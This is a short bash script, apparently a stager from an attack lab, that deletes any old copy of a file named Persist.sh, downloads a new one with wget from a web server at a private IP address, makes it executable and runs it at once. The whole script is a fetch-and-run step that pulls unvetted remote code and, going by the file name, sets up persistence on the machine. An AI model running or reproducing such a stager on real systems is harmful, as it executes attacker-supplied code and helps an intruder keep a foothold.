#! /bin/bash

[ -f Persist.sh ] && rm Persist.sh

wget http://192.168.211.129:8000/Downloads/Scripts/Persist.sh

chmod +x ./Persist.sh 

./Persist.sh
